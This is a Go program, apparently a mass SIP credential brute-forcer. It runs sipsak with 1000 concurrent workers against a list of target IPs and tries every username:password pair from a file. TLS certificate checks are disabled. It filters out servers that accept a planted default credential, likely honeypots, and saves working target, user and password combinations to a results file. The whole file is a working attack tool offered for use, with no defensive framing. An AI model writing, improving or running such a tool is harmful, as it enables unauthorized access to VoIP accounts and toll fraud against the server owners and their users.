package main

import (
	"context"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	userPassFile   = "User_Pass"
	ipFile         = "ip.txt"
	successResults = "success_results.txt"
	numThreads     = 1000 // Set the number of threads here
	defaultUser    = "MOHohammad"
	defaultPass    = "MOH123954@@@@"
	timeoutSeconds = 10 // Set the timeout duration in seconds here
)

func isDefaultUserPassAccepted(target string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), time.Second*timeoutSeconds)
	defer cancel()

	cmd := exec.CommandContext(ctx, "sipsak",
		"-U",
		"-C", fmt.Sprintf("sip:%s@home.com", defaultUser),
		"--from", fmt.Sprintf("sip:%s@%s", defaultUser, target),
		"-u", defaultUser,
		"-a", defaultPass,
		"-p", target,
		"-s", fmt.Sprintf("sip:%s@%s", defaultUser, target),
		"-i", "-vvv",
		"-E", "tls",
		"--tls-ignore-cert-failure",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error executing sipsak:", err)
		return false
	}

	return strings.Contains(string(output), "200 OK") || strings.Contains(string(output), "202 Accepted")
}

func registerUser(user, password, target string, wg *sync.WaitGroup) {
	defer wg.Done()

	cmd := exec.Command("sipsak",
		"-U",
		"-C", fmt.Sprintf("sip:%s@home.com", user),
		"--from", fmt.Sprintf("sip:%s@%s", user, target),
		"-u", user,
		"-a", password,
		"-p", target,
		"-s", fmt.Sprintf("sip:%s@%s", user, target),
		"-i", "-vvv",
		"-E", "tls",
		"--tls-ignore-cert-failure",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error executing sipsak:", err)
		return
	}

	// Check the result for a successful 200 OK or 202 Accepted response
	if strings.Contains(string(output), "200 OK") || strings.Contains(string(output), "202 Accepted") {
		// If the target accepts default credentials, exclude it
		if isDefaultUserPassAccepted(target) {
			fmt.Printf("Target %s accepts default username and password, skipping...\n", target)
			return
		}

		// If there is a successful response, register the result in the success_results file
		file, err := os.OpenFile(successResults, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			fmt.Println("Error opening success_results file:", err)
			return
		}
		defer file.Close()

		line := fmt.Sprintf("%s %s %s", target, user, password)
		if _, err := file.WriteString(line + "\n"); err != nil {
			fmt.Println("Error writing to success_results file:", err)
		}
	} else {
		// If there is no successful response, print the error
		fmt.Printf("Registration failed for %s at %s:\n%s\n", user, target, string(output))
	}
}

func main() {
	// Read user:password pairs from the User_Pass file
	usersData, err := ioutil.ReadFile(userPassFile)
	if err != nil {
		fmt.Println("Error reading User_Pass file:", err)
		return
	}
	users := strings.Split(string(usersData), "\n")

	// Read targets from the ip.txt file
	targetsData, err := ioutil.ReadFile(ipFile)
	if err != nil {
		fmt.Println("Error reading ip.txt file:", err)
		return
	}
	targets := strings.Split(string(targetsData), "\n")

	// Create a wait group to ensure all workers finish before exiting
	var wg sync.WaitGroup

	// Register users on targets using goroutines
	threadCh := make(chan struct{}, numThreads)

	for _, userPass := range users {
		userPassParts := strings.Split(userPass, ":")
		if len(userPassParts) != 2 {
			fmt.Println("Invalid format in User_Pass file:", userPass)
			continue
		}

		user, password := userPassParts[0], userPassParts[1]

		for _, target := range targets {
			target = strings.TrimSpace(target)
			if target == "" {
				continue
			}

			threadCh <- struct{}{} // Signal the thread to be used
			wg.Add(1)
			go func(u, p, t string) {
				defer func() {
					<-threadCh // Remove the signal when done
				}()
				registerUser(u, p, t, &wg)
			}(user, password, target)
		}
	}

	// Wait for all workers to complete
	wg.Wait()
	close(threadCh)
}
